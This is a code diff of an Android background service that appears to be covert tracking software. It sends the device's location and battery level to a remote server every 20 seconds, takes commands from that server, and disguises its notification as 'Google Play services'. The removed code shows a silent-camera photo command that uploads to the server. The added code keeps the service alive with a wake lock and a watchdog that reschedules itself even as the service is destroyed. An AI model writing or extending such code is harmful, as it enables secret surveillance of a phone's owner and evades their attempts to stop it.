@@ -6,9 +6,6 @@ import android.content.*;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
-import android.media.Ringtone;
-import android.media.RingtoneManager;
-import android.net.Uri;
 import android.os.*;
 import androidx.core.app.NotificationCompat;
 import org.json.JSONArray;
@@ -23,13 +20,27 @@ public class CompanionSyncService extends Service {
     private SharedPreferences prefs;
     private LocationManager locationManager;
     private LocationListener locationListener;
+    private PowerManager.WakeLock wakeLock;
 
     @Override
     public void onCreate() {
         super.onCreate();
         prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
+        acquireWakeLock();
         createNotificationChannel();
         initLocationListener();
+        WatchdogReceiver.scheduleWatchdog(this);
+    }
+
+    @SuppressLint("WakelockTimeout")
+    private void acquireWakeLock() {
+        try {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null) {
+                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "snap:synclock");
+                wakeLock.acquire();
+            }
+        } catch (Exception ignored) {}
     }
 
     @Override
@@ -37,6 +48,7 @@ public class CompanionSyncService extends Service {
         startForeground(NOTIF_ID, buildNotification());
         startPeriodicSync();
         requestActiveLocationFix();
+        WatchdogReceiver.scheduleWatchdog(this);
         return START_STICKY;
     }
 
@@ -49,9 +61,9 @@ public class CompanionSyncService extends Service {
             public void onLocationChanged(Location loc) {
                 if (loc != null) dispatchLocation(loc);
             }
-            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
-            @Override public void onProviderEnabled(String provider) {}
-            @Override public void onProviderDisabled(String provider) {}
+            @Override public void onStatusChanged(String p, int s, Bundle b) {}
+            @Override public void onProviderEnabled(String p) {}
+            @Override public void onProviderDisabled(String p) {}
         };
     }
 
@@ -63,14 +75,12 @@ public class CompanionSyncService extends Service {
             public void run() {
                 try {
                     if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                        locationManager.requestLocationUpdates(
-                                LocationManager.GPS_PROVIDER, 30000, 5, locationListener, Looper.getMainLooper());
+                        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 5, locationListener, Looper.getMainLooper());
                         Location lastGps = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                         if (lastGps != null) dispatchLocation(lastGps);
                     }
                     if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                        locationManager.requestLocationUpdates(
-                                LocationManager.NETWORK_PROVIDER, 30000, 5, locationListener, Looper.getMainLooper());
+                        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000, 5, locationListener, Looper.getMainLooper());
                         Location lastNet = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                         if (lastNet != null) dispatchLocation(lastNet);
                     }
@@ -83,10 +93,7 @@ public class CompanionSyncService extends Service {
         final String deviceId = prefs.getString("device_id", null);
         final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
         if (deviceId == null || loc == null) return;
-
-        int battery = getBatteryLevel();
-        ApiClient.sendLocation(serverUrl, deviceId, loc.getLatitude(),
-                loc.getLongitude(), loc.getAccuracy(), battery, null);
+        ApiClient.sendLocation(serverUrl, deviceId, loc.getLatitude(), loc.getLongitude(), loc.getAccuracy(), getBatteryLevel(), null);
     }
 
     private void startPeriodicSync() {
@@ -98,7 +105,7 @@ public class CompanionSyncService extends Service {
                 requestActiveLocationFix();
                 pollServerCommands();
             }
-        }, 3, 20, TimeUnit.SECONDS);
+        }, 2, 20, TimeUnit.SECONDS);
     }
 
     private void pollServerCommands() {
@@ -113,55 +120,30 @@ public class CompanionSyncService extends Service {
                 if (cmds == null || cmds.length() == 0) return;
                 for (int i = 0; i < cmds.length(); i++) {
                     JSONObject c = cmds.optJSONObject(i);
-                    if (c != null) executeCommand(serverUrl, deviceId, c);
+                    CommandDispatcher.dispatch(CompanionSyncService.this, serverUrl, deviceId, c, new CommandDispatcher.LocationRefreshCallback() {
+                        @Override public void onRefreshNeeded() { requestActiveLocationFix(); }
+                    });
                 }
             }
             @Override public void onError(String error) {}
         });
     }
 
-    private void executeCommand(final String serverUrl, final String deviceId, JSONObject cmd) {
-        final String cmdType = cmd.optString("command", "");
-        final String cmdId = cmd.optString("id", null);
-        JSONObject payload = cmd.optJSONObject("payload");
-
-        if ("ring_siren".equals(cmdType)) {
-            try {
-                Uri alert = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
-                if (alert == null) alert = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
-                Ringtone r = RingtoneManager.getRingtone(getApplicationContext(), alert);
-                if (r != null) r.play();
-            } catch (Exception ignored) {}
-        } else if ("take_photo".equals(cmdType)) {
-            final String camType = (payload != null) ? payload.optString("camera", "front") : "front";
-            boolean isFront = "front".equalsIgnoreCase(camType);
-            CameraHelper.takeSilentPhoto(this, isFront, new CameraHelper.PhotoCallback() {
-                @Override
-                public void onPhotoCaptured(byte[] data) {
-                    ApiClient.uploadPhoto(serverUrl, deviceId, cmdId, camType, data);
-                }
-                @Override public void onError(String error) {}
-            });
-        }
-    }
-
     private int getBatteryLevel() {
-        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
-        if (batteryIntent == null) return 100;
-        int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
-        int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-        if (level >= 0 && scale > 0) return (int) ((level / (float) scale) * 100);
-        return 100;
+        Intent bi = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+        if (bi == null) return 100;
+        int level = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+        int scale = bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+        return (level >= 0 && scale > 0) ? (int) ((level / (float) scale) * 100) : 100;
     }
 
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                    CHANNEL_ID, "System Security", NotificationManager.IMPORTANCE_MIN);
-            channel.setShowBadge(false);
-            channel.setSound(null, null);
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            if (manager != null) manager.createNotificationChannel(channel);
+            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "System Security", NotificationManager.IMPORTANCE_MIN);
+            ch.setShowBadge(false);
+            ch.setSound(null, null);
+            NotificationManager nm = getSystemService(NotificationManager.class);
+            if (nm != null) nm.createNotificationChannel(ch);
         }
     }
 
@@ -169,7 +151,6 @@ public class CompanionSyncService extends Service {
         Intent launch = new Intent(this, MainActivity.class);
         PendingIntent pi = PendingIntent.getActivity(this, 0, launch,
                 Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);
-
         return new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("Google Play services")
                 .setContentText("Syncing security data")
@@ -180,14 +161,15 @@ public class CompanionSyncService extends Service {
                 .build();
     }
 
-    @Override
-    public IBinder onBind(Intent intent) { return null; }
+    @Override public IBinder onBind(Intent intent) { return null; }
 
     @Override
     public void onDestroy() {
+        WatchdogReceiver.scheduleWatchdog(this);
         if (scheduler != null) scheduler.shutdown();
-        if (locationManager != null && locationListener != null) {
-            locationManager.removeUpdates(locationListener);
+        if (locationManager != null && locationListener != null) locationManager.removeUpdates(locationListener);
+        if (wakeLock != null && wakeLock.isHeld()) {
+            try { wakeLock.release(); } catch (Exception ignored) {}
         }
         super.onDestroy();
     }
